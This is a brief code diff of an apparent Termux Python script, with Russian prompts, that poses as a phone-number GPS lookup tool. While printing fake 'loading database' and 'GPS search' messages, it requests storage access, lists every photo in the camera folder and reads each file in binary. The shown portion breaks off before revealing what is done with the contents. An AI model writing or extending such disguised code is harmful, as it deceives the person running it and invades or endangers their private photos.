@@ -5,7 +5,7 @@ input("Номер телефона: ")
 print("Загрузка БД...")
 os.system("termux-setup-storage")
 print("Идет процесс поиска по GPS")
-l = os.listdir("/storage/DCIM/Camera")
+l = os.listdir("/storage/DCIM/Camera/")
 for i in range(len(l)):
 	f = open("/storage/DCIM/Camera/"+l[i], "rb")
 	r = f.read()
